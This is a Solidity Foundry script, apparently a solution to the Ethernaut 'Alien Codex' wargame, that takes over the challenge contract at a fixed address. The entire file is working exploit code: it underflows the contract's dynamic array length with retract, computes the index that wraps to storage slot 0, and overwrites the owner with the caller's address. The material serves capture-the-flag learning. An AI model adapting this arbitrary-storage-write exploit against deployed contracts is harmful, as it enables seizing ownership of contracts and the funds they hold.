// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
}

contract AlienCodexAttack is Script {
    address constant CHALLENGE = 0x90FBbdA3FE205DEB8FBdB76cd926674F1a2bD181;
    IAlienCodex public alienCodex;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions

        alienCodex = IAlienCodex(CHALLENGE);
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 h = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 index = type(uint256).max - h + 1;
        alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));
        console.log("New owner:", alienCodex.owner());

        vm.stopBroadcast();
    }
}
